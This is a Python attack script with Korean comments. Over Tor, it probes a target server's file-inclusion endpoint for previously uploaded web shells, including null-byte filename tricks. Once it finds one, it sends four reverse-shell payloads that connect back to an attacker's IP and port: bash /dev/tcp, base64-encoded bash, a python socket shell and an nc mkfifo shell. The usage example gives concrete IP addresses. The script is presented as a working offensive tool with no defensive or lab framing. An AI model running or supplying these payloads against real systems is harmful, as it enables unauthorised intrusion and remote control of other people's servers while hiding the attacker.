#!/usr/bin/env python3
"""
작동하는 웹쉘 찾기
업로드된 모든 파일을 테스트
"""

import requests
import sys

def find_working_webshell(target_ip):
    base_url = f"http://{target_ip}"

    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    print(f"[*] 타겟: {target_ip}")
    print("[*] 작동하는 웹쉘 검색 중...\n")

    # 업로드된 파일 목록
    files = [
        "shell_4727.php",
        "shell_4727.php%00.png",
        "shell_4727.php%00.gif",
        "avatar_4727.jpg",
        "capture_4133.png",
        "banner.png",
        "photo.php.jpg",
        "photo.php%00.jpg",
        "image_1253.jpg",
        "avatar_1763103728.jpg",
    ]

    # 파라미터 목록
    params = ['x', 'cmd', 'command', 'c', 'exec', 'e']

    # 테스트 명령 (의심스럽지 않은 것)
    test_cmd = 'pwd'

    working_shells = []

    for filename in files:
        for param in params:
            try:
                url = f"{base_url}/file.php?name=uploads/{filename}&{param}={test_cmd}"

                resp = session.get(url, timeout=5)

                if resp.status_code == 200 and len(resp.text.strip()) > 0:
                    # 경로 같은 게 나오면 성공
                    if '/var' in resp.text or '/home' in resp.text or '/tmp' in resp.text or 'www' in resp.text:
                        print(f"[+] ✅ 작동: {filename} (파라미터: {param})")
                        print(f"    응답: {resp.text.strip()[:80]}")
                        print(f"    URL: {url}\n")

                        working_shells.append({
                            'file': filename,
                            'param': param,
                            'url': url
                        })
                        break  # 이 파일은 작동하니 다음 파일로

            except:
                pass

    if working_shells:
        print(f"\n{'='*60}")
        print(f"[+] 작동하는 웹쉘: {len(working_shells)}개")
        print(f"{'='*60}")

        for shell in working_shells:
            print(f"\n파일: {shell['file']}")
            print(f"파라미터: {shell['param']}")
            print(f"테스트: curl -x socks5h://127.0.0.1:9050 \"{base_url}/file.php?name=uploads/{shell['file']}&{shell['param']}=id\"")

        return working_shells[0]  # 첫 번째 작동하는 것 반환

    else:
        print("\n[-] 작동하는 웹쉘을 찾을 수 없습니다")
        return None

def trigger_reverse_shell(target_ip, shell_info, attacker_ip, attacker_port):
    """작동하는 웹쉘로 리버스 쉘 트리거"""

    if not shell_info:
        return

    print(f"\n{'='*60}")
    print("[*] 리버스 쉘 트리거")
    print(f"{'='*60}")

    base_url = f"http://{target_ip}"

    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    print(f"\n[*] 웹쉘: {shell_info['file']}")
    print(f"[*] 파라미터: {shell_info['param']}")
    print(f"[*] C2: {attacker_ip}:{attacker_port}")

    print(f"\n[!] C2 서버에서 리스너 시작:")
    print(f"    nc -lvnp {attacker_port}")

    input("\n[?] 준비되면 Enter...")

    import base64
    reverse_shell_cmd = f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"
    b64_payload = base64.b64encode(reverse_shell_cmd.encode()).decode()

    # 리버스 쉘 페이로드
    payloads = [
        f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
        f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'",
        f"echo {b64_payload}|base64 -d|bash",
        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {attacker_ip} {attacker_port} >/tmp/f",
    ]

    for i, payload in enumerate(payloads, 1):
        print(f"\n[{i}/{len(payloads)}] 페이로드 #{i}")

        try:
            url = f"{base_url}/file.php?name=uploads/{shell_info['file']}&{shell_info['param']}={payload}"
            resp = session.get(url, timeout=3)
            print(f"    [+] 전송 완료")
        except:
            print(f"    [+] 타임아웃 (연결되었을 수 있음)")

        import time
        time.sleep(2)

    print("\n[+] 모든 페이로드 전송 완료")
    print("[!] C2 리스너 확인하세요")

def main():
    if len(sys.argv) < 2:
        print("사용법: python3 92_find_working_webshell.py <TARGET_IP> [ATTACKER_IP] [PORT]")
        print("예시: python3 92_find_working_webshell.py 43.201.154.142 57.181.28.7 4444")
        sys.exit(1)

    target_ip = sys.argv[1]

    # 웹쉘 찾기
    shell_info = find_working_webshell(target_ip)

    # 리버스 쉘 트리거 (인자가 있으면)
    if len(sys.argv) >= 4 and shell_info:
        attacker_ip = sys.argv[2]
        attacker_port = int(sys.argv[3])

        trigger_reverse_shell(target_ip, shell_info, attacker_ip, attacker_port)

if __name__ == "__main__":
    main()
